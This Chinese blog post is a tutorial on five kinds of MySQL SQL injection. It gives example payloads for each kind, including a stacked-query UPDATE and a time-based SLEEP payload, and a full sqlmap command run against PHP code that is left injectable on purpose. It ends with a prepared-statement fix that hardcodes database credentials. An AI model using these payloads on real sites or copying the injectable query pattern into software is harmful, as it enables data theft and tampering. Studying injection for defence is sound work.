---
title: web安全之sql注入
date: 2016-11-02 15:04:02
tags:
---
.........
<!--more-->
SQL的注入类型有以下5种：

Boolean-based blind SQL injection（布尔型注入） Error-based SQL injection（报错型注入） UNION query SQL injection（可联合查询注入） Stacked queries SQL injection（可多语句查询注入） Time-based blind SQL injection（基于时间延迟注入）
下文都是基�php、mysql测试得到的结果。

Boolean-based blind SQL injection（布尔型注入）
通过判断页面返回情况获得想要的信息。

如下SQL注入：

1 http://hello.com/view?id=1 and substring(version(),1,1)=5

如果服务端MySQL版本是5.X的话，那么页面返回的内容就会跟正常请求一样。攻击者就可以通过这种方式获取到MySQL的各类信息。

Error-based SQL injection（报错型注入）
如果页面能够输出SQL报错信息，则可以从报错信息中获得想要的信息。

典型的就是利用group by的duplicate entry错误。关于这个错误，貌似是MySQL存在的 bug： duplicate key for entry on select? 、 SQL Injection attack - What does this do?

如下SQL注入：

1 http://hello.com/view?id=1%20AND%20(SELECT%207506%20FROM(SELECT%20COUNT(*),CONCAT(0x717a707a71,(SELECT%20MID((IFNULL(CAST(schema_name%20 2 AS%20CHAR),0x20)),1,54)%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20 3 LIMIT%202,1),0x7178786271,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_ 4 SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)

在抛出的SQL错误中会包含这样的信息： Duplicate entry 'qzpzqttqxxbq1' for key 'group_key' ，其中qzpzq和qxxbq分别是0x717a707a71和0x7178786271，用这两个字符串包住了tt（即数据库名），是为了方便sql注入程序从返回的错误内容中提取出信息。

UNION query SQL injection（可联合查询注入）
最快捷的方法，通过UNION查询获取到所有想要的数据，前提是请求返回后能输出SQL执行后查询到的所有内容。

如下SQL注入：

1 http://hello.com/view?id=1 UNION ALL SELECT SCHEMA_NAME, DEFAULT_CHARACTER_SET_NAME FROM INFORMATION_SCHEMA.SCHEMATA

Stacked queries SQL injection（可多语句查询注入）
即能够执行多条查询语句，非常危险，因为这意味着能够对数据库直接做更新操作。

如下SQL注入：

1 http://hello.com/view?id=1;update t1 set content = 'aaaaaaaaa'

在第二次请求 http://hello.com/view?id=1 时，会发现所有的content都被设置为aaaaaaaaa了。

Time-based blind SQL injection（基于时间延迟注入）
页面不会返回错误信息，不会输出UNION注入所查出来的泄露的信息。类似搜索这类请求，boolean注入也无能为力，因为搜索返回空也属于正常的，这时就得采用time-based的注入了，即判断请求响应的时间，但该类型注入获取信息的速度非常慢。

如下SQL注入：

1 http://hello.com/view?q=abc' AND (SELECT * FROM (SELECT(SLEEP(5)))VCVe) OR 1 = '

该请求会使MySQL的查询睡眠5S，攻击者可以通过添加条件判断到SQL中，比如IF(substring(version(),1,1)=5, sleep(5), ‘t’) AS value就能做到类似boolean注入的效果，如果睡眠了5s，那么说明MySQL版本为5，否则不是，但这种方式获取信息的速度就会很慢了，因为要做非常多的判断，并且需要花时间等待，不断地去测试出相应的值出来。

来做个实验
使用SQL注入工具：sqlmap

服务端代码（输出SQL报错信息、输出SQL查出来的所有内容）：

1 <?php 2 $pdo = new PDO("mysql:host=$host;dbname=tt", $db_user, $password); 3 $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); 4 $res = $pdo->query('select * from t1 where id = ' . $_GET['id']); 5 var_dump($res->fetchAll()); 6 ?>
执行sqlmap获取所有数据库名：

1 sqlmap -u http://host/id\=1\* --dbms=mysql --dbs -v 3 --level=5 --risk=3

查看执行结果：


认识SQL注入的类型
从输出结果可以看出支持所有类型的SQL注入。
获取到的数据库名：


认识SQL注入的类型
服务端代码去掉SQL报错信息：

1 <?php 2 $pdo = new PDO("mysql:host=$host;dbname=tt", $db_user, $password); 3 $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT); 4 $res = $pdo->query('select * from t1 where id = ' . $_GET['id']); 5 var_dump($res->fetchAll()); 6 ?>
重新执行sqlmap，查看执行结果：


认识SQL注入的类型
从输出结果可以看出无法使用error-based注入了。

服务端代码改为去掉任何的输出信息：

1 <?php 2 $pdo = new PDO("mysql:host=$host;dbname=tt", $db_user, $password); 3 $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT); 4 $res = $pdo->query('select * from t1 where id = ' . $_GET['id']); 5 ?> 
认识SQL注入的类型
从输出结果可以看出只支持stacked注入和time-based注入，但要获得数据库信息只能使用time-based注入获得，且会做非常多次的注入尝试，如下图：


认识SQL注入的类型
如何防止SQL注入？
使用MySQL提供的 SQL Syntax for Prepared Statements ，即语句预处理，从web开发的角度来讲是参数绑定查询，能够抵挡住上述所说的所有SQL注入= =

1 <?php 2 $pdo = new PDO('mysql:host=192.168.103.111;dbname=tt', 'test', '19921212'); 3 $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); 4 $res = $pdo->prepare('select * from t1 where id = ?'); 5 $res->execute([$_GET['id']]); 6 var_dump($res->fetchAll()); 7 ?>
sqlmap执行结果：
